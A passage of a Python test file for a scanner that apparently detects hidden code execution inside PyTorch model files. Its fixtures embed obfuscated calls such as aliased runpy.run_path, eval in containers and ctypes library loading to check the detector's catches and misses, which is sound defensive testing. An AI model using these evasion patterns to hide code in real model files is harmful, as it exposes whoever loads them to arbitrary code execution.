        source = prefix + (b"# middle\n" * 130_000) + tail

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_middle_tail_alias_with_prefix_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        tail_prefix = b"".join(f"def benign_tail_{index}():\n    return {index}\n\x00".encode() for index in range(24))
        tail_suffix = b"".join(f"def after_tail_{index}():\n    return {index}\n\x00".encode() for index in range(24))
        source = (
            b"\x00\xffimport runpy as rp\n"
            + filler
            + b"\x00\xff"
            + tail_prefix
            + b"def payload():\n    return rp.run_path('payload.py')\n\x00"
            + tail_suffix
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_from_compound_prefix_import(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffif True: import runpy as rp\n"
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_full_prefixed_tail_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        tail_padding_line = b"    # tail\n"
        tail_padding = tail_padding_line * (
            (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES - 200) // len(tail_padding_line)
        )
        source = (
            b"\x00\xffimport runpy as rp\n"
            + filler
            + b"\x00\xffdef payload():\n"
            + tail_padding
            + b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_escaped_triple_quote_prefix_import_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xfftext = """\n'
            b'not closed \\"""\n'
            b"import runpy as rp\n"
            b'"""\n' + filler + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_runpy_alias_from_framed_prefix_assignment_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\nrun = runpy.run_path\n" + filler + b"def payload():\n    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_framed_tail_alias_with_prefix_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy as rp\n" + filler + b"\x00\xffdef payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_after_noisy_prefix_context_budget(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        detector = JITScriptDetector()
        monkeypatch.setattr(jit_script_module, "_EMBEDDED_PYTHON_SCAN_WINDOW_BYTES", 4096)
        long_alias = "unused_" + "x" * 900
        noise = b"".join(f"import runpy as {long_alias}_{index}\n".encode() for index in range(20))
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xff"
            + noise
            + b"import runpy as rp\n"
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_call_from_prefix_annotated_assignment_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\nrun: object = runpy.run_path\n"
            + filler
            + b"def payload():\n    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_module_alias_from_prefix_assignment_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\nrp = runpy\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_call_from_prefix_unpack_assignment_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\n(run,) = (runpy.run_path,)\n"
            + filler
            + b"def payload():\n    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("assignment", "call"),
        [
            (b"callbacks = [eval]\n", b"callbacks[0]('1+1')"),
            (b"callbacks = {'run': eval}\n", b"callbacks['run']('1+1')"),
        ],
    )
    def test_scan_model_detects_tail_builtin_call_from_prefix_container_context(
        self,
        assignment: bytes,
        call: bytes,
    ) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = b"\x00\xff" + assignment + filler + b"def payload():\n    return " + call + b"\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    def test_scan_model_ignores_overwritten_prefix_container_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffcallbacks = [eval]\n"
            b"callbacks[0] = len\n" + filler + b"def benign():\n    return callbacks[0]('1+1')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)

    def test_scan_model_detects_tail_call_from_prefix_module_alias_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\nrp = runpy\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_call_from_literal_true_compound_import_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffif True: import runpy as rp\n"
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_one_hop_alias_after_prefix_from_import(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xfffrom runpy import run_path\nrun = run_path\n"
            + filler
            + b"def payload():\n    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_framed_tail_snippet_with_prefix_alias_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy as rp\n" + filler + b"\x00\xffdef payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_prefix_alias_call_after_middle_tail_start(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        harmless_tail = b"".join(
            f"def harmless_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(2 * jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 4)
        )
        source = (
            b"\x00\xffimport runpy as rp\n"
            + filler
            + harmless_tail
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_hoist_function_local_prefix_import_into_tail_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffdef helper():\n"
            b"    import runpy as rp\n" + filler + b"def payload():\n"
            b"    import os\n"
            b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_use_commented_prefix_import_as_tail_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = b"\x00\xff# import runpy as rp\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_parse_docstring_priority_import_as_statement(self) -> None:
        detector = JITScriptDetector()
        source = b'\x00\xffdef payload():\n    """\n    import os\n    """\n    return 1\n\x00MODEL-FRAMING'

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(f.type in {"dangerous_import", "code_execution_pattern"} for f in findings)

    def test_scan_model_ignores_late_priority_alias_use_inside_multiline_string_with_trigger(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\n"
            + padding
            + b'import os\ntext = """\nrp.run_path("payload.py")\n"""\n'
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_hoist_prefix_import_from_triple_quoted_string(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xfftext = """\nimport runpy as rp\n"""\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_hoist_prefix_import_after_escaped_triple_quote(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xfftext = """\nnot close \\"""\nimport runpy as rp\n"""\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_real_prefix_import_after_single_quoted_triple_marker(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xffmarker = \'"""\'\nimport runpy as rp\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_import_after_comment_line_closes_triple_quote(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xfftext = """\n# closes """\nimport runpy as rp\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_restored_runpy_execution_after_static_overwrite(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n"
            b"    original = runpy.run_path\n"
            b"    runpy.run_path = len\n"
            b"    runpy.run_path = original\n"
            b"    return runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_priority_snippets_require_import_boundaries_after_cap(self) -> None:
        def candidate(
            value: tuple[bytes, tuple[int, int]],
        ) -> tuple[bytes, tuple[int, int], tuple[tuple[int, int], ...]]:
            return value[0], value[1], (value[1],)

        leading_candidates = [
            candidate((f"import harmless_{index}\n".encode(), (index, index + 1)))
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS)
        ]
        host_candidate = candidate((b"import host_123\n", (100, 101)))
        system_candidate = candidate((b"class System:\n    pass\n", (200, 201)))
        os_candidate = candidate((b"import os\n", (300, 301)))
        aliased_runpy_candidate = candidate((b"import harmless as h, runpy as rp\n", (350, 351)))
        continued_runpy_candidate = candidate((b"import harmless as h, \\\n    runpy as rp\n", (375, 376)))
        continued_from_runpy_candidate = candidate((b"from runpy\\\n import run_path\n", (400, 401)))
        runpy_candidate = candidate((b"from runpy import run_path\n", (425, 426)))

        selected = jit_script_module._prioritized_embedded_python_snippets(
            [
                *leading_candidates,
                host_candidate,
                system_candidate,
                os_candidate,
                aliased_runpy_candidate,
                continued_runpy_candidate,
                continued_from_runpy_candidate,
                runpy_candidate,
            ]
        )

        selected_candidates = {candidate for candidate, _span, _real_ranges in selected}
        assert host_candidate[0] not in selected_candidates
        assert system_candidate[0] not in selected_candidates
        assert os_candidate[0] in selected_candidates
        assert aliased_runpy_candidate[0] in selected_candidates
        assert continued_runpy_candidate[0] in selected_candidates
        assert continued_from_runpy_candidate[0] in selected_candidates
        assert runpy_candidate[0] in selected_candidates

    def test_prioritized_snippet_budget_counts_unique_spans(self) -> None:
        duplicate = (b"import harmless\n", (0, 16), ((0, 16),))
        unique = (b"import later\n", (20, 32), ((20, 32),))

        selected, omitted_spans = jit_script_module._select_prioritized_embedded_python_snippets(
            [*[duplicate] * jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS, unique]
        )

        assert selected == [duplicate, unique]
        assert omitted_spans == []

    def test_priority_snippets_are_budgeted_and_bounded_after_default_cap(self) -> None:
        def candidate(
            value: tuple[bytes, tuple[int, int]],
        ) -> tuple[bytes, tuple[int, int], tuple[tuple[int, int], ...]]:
            return value[0], value[1], (value[1],)

        leading_candidates = [
            candidate((f"import harmless_{index}\n".encode(), (index, index + 1)))
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS)
        ]
        priority_payload = b"import os\n" + (b"# pad\n" * 4000)
        priority_candidates = [
            candidate(
                (
                    priority_payload,
                    (
                        1_000 + index * len(priority_payload),
                        1_000 + (index + 1) * len(priority_payload),
                    ),
                )
            )
            for index in range(jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPETS + 4)
        ]

        selected = jit_script_module._prioritized_embedded_python_snippets([*leading_candidates, *priority_candidates])

        assert len(selected) == (
            jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS
            + jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPETS
        )
        priority_selected = selected[jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS :]
        assert all(
            len(candidate) <= jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES
            for candidate, _span, _real_ranges in priority_selected
        )

    def test_scan_model_ignores_binary_framed_top_level_replaced_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffimport runpy\nrunpy.run_path = len\nrunpy.run_path([])\n\x00MODEL-FRAMING"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_long_tail_alias_aware_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        tail = b"\n".join(b"tail" for _ in range(jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 20))
        source = (
            b"\x00\xffdef payload():\n    from runpy import run_path as run\n    return run('payload.py')\n\x00" + tail
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_binary_prefixed_replaced_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    import runpy\n    runpy.run_path = len\n    return runpy.run_path([])\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_lossy_decoded_string_literal_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    # ignored invalid bytes: "
            + (b"\xff" * 64)
            + b"\n    return \"runpy.run_path('payload.py')\"\n\x00\xffMODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_runpy_match_after_benign_parsed_snippet(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def benign():\n"
            b"    return \"runpy.run_path('payload.py')\"\n"
            b"}\n"
            b"def payload():\n"
            b"if True print('broken')\n"
            b"runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_webbrowser_and_ctypes_calls(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import builtins\n"
            b"    import ctypes\n"
            b"    import os\n"
            b"    import webbrowser\n"
            b"    webbrowser.get().open.__call__('https://example.invalid')\n"
            b"    webbrowser.get().__getattribute__('open')('https://example.invalid')\n"
            b"    ctypes.windll.kernel32\n"
            b"    ctypes.cdll['msvcrt'].printf(b'x')\n"
            b"    ctypes.cdll.__getitem__('msvcrt')\n"
            b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader_kw = ctypes.LibraryLoader(dlltype=ctypes.CDLL)\n"
            b"    loader_alias = ctypes.LibraryLoader(ctypes.cdll._dlltype)\n"
            b"    loader_method = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader.msvcrt.printf(b'x')\n"
            b"    loader_kw.payload.printf(b'x')\n"
            b"    loader_alias.aliaslib.printf(b'x')\n"
            b"    loader_method.LoadLibrary('methodlib')\n"
            b"    loader_method.__getitem__('getitemlib')\n"
            b"    loader_method.LoadLibrary(name='keywordlib')\n"
            b"    loader_method.__getitem__(name='keywordgetitem')\n"
            b"    loader_variable = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    library_name = 'variablelib'\n"
            b"    loader_variable.LoadLibrary(library_name)\n"
            b"    loader_variable.__getitem__(library_name)\n"
            b"    ctypes.LibraryLoader.LoadLibrary(ctypes.cdll, 'unboundlib')\n"
            b"    ctypes.LibraryLoader.__getitem__(ctypes.cdll, 'unboundgetitem')\n"
            b"    ctypes.LibraryLoader.LoadLibrary(self=ctypes.cdll, name='selfkeywordlib')\n"
            b"    ctypes.LibraryLoader.__getitem__(self=ctypes.cdll, name='selfkeywordgetitem')\n"
            b"    object.__getattribute__(ctypes.cdll, 'LoadLibrary')('objectmethodlib')\n"
            b"    object.__getattribute__(ctypes.cdll, '__getitem__')('objectgetitem')\n"
            b"    ctypes.windll.kernel32 = len\n"
            b"    ctypes.windll.__getattr__('kernel32')\n"
            b"    loader_conditional = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    conditional_load = loader_conditional.LoadLibrary\n"
            b"    if flag:\n"
            b"        conditional_load = ctypes.LibraryLoader\n"
            b"    conditional_load('conditionalmethod')\n"
            b"    ctypes.cdll.augmented += 1\n"
            b"    loader_augmented = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader_augmented.augmented += 1\n"
            b"    class MyCDLL(ctypes.CDLL):\n"
            b"        pass\n"
            b"    ctypes.LibraryLoader(MyCDLL).subclasslib\n"
            b"    getattr(ctypes.windll, 'user32')\n"
            b"    ctypes.windll.__getattr__('advapi32')\n"
            b"    ctypes.cdll.__getattr__(name='keywordgetattr')\n"
            b"    ctypes.LibraryLoader(*(ctypes.CDLL,)).unpacklib\n"
            b"    class SafeBase:\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.name = name\n"
            b"    class ExplicitSuperCDLL(SafeBase, ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            super(SafeBase, self).__init__(name)\n"
            b"    ctypes.LibraryLoader(ExplicitSuperCDLL).superlib\n"
            b"    return getattr(ctypes.LibraryLoader(ctypes.CDLL), 'attrlib')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        patterns = {finding.pattern for finding in findings if finding.type == "code_execution_pattern"}
        assert "Web browser launch detected" in patterns
        assert "Native library loading detected" in patterns

    def test_scan_model_preserves_dynamic_member_risk_after_conditional_overwrite(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    import webbrowser\n"
            b"    browser = webbrowser.get()\n"
            b"    if replace:\n"
            b"        browser.open = len\n"
            b"        ctypes.windll.kernel32 = len\n"
            b"    browser.open('https://example.invalid')\n"
            b"    return ctypes.windll.kernel32\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        patterns = {finding.pattern for finding in findings if finding.type == "code_execution_pattern"}
        assert "Web browser launch detected" in patterns
        assert "Native library loading detected" in patterns

    def test_scan_model_keeps_webbrowser_member_overwrites_controller_local(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import webbrowser\n"
            b"    safe_browser = webbrowser.get('safe')\n"
            b"    safe_browser.open = len\n"
            b"    other_browser = webbrowser.get('other')\n"
            b"    return other_browser.open('https://example.invalid')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_keeps_library_loader_member_overwrites_instance_local(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    safe_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    safe_loader.payload = len\n"
            b"    other_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    return other_loader.payload\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_detects_hasattr_ctypes_load_and_local_init_alias(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    hasattr(ctypes.cdll, 'hasattrlib')\n"
            b"    hasattr(ctypes.LibraryLoader(ctypes.CDLL), 'hasattrpayload')\n"
            b"    ctypes.cdll.__getattr__(name='keywordgetattr')\n"
            b"    ctypes.LibraryLoader(*(ctypes.CDLL,)).starredlib\n"
            b"    class LocalAliasCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            init = ctypes.CDLL.__init__\n"
            b"            init(self, name)\n"
            b"    ctypes.LibraryLoader(LocalAliasCDLL).localaliaslib\n"
            b"    class Safe:\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.name = name\n"
            b"    class SkipSafeCDLL(Safe, ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            super(Safe, self).__init__(name)\n"
            b"    ctypes.LibraryLoader(SkipSafeCDLL).superskiplib\n"
            b"    class ClassBodyInitCDLL(Safe, ctypes.CDLL):\n"
            b"        __init__ = ctypes.CDLL.__init__\n"
            b"    ctypes.LibraryLoader(ClassBodyInitCDLL).classbodyinitlib\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_preserves_dynamic_member_risk_after_reassignment_and_delete(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    import webbrowser\n"
            b"    browser = webbrowser.get('safe')\n"
            b"    browser.open = len\n"
            b"    browser = webbrowser.get('other')\n"
            b"    browser.open('https://example.invalid')\n"
            b"    other = webbrowser.get()\n"
            b"    other.open = len\n"
            b"    del other.open\n"
            b"    other.open('https://example.invalid')\n"
            b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader.payload = len\n"
            b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader.payload\n"
            b"    other_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    other_loader.payload = len\n"
            b"    del other_loader.payload\n"
            b"    other_loader.payload\n"
            b"    ctypes.windll.payload = len\n"
            b"    del ctypes.windll.payload\n"
            b"    return ctypes.windll.payload\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        patterns = {finding.pattern for finding in findings if finding.type == "code_execution_pattern"}
        assert "Web browser launch detected" in patterns
        assert "Native library loading detected" in patterns

    def test_scan_model_detects_ctypes_cdll_subclass_class_local_initializer_alias(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    class MyCDLL(ctypes.CDLL):\n"
            b"        init = ctypes.CDLL.__init__\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.init(name)\n"
            b"    return ctypes.LibraryLoader(MyCDLL).payload\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_ignores_unreachable_ctypes_cdll_subclass_initializer(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    class SafeCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            if False:\n"
            b"                super().__init__(name)\n"
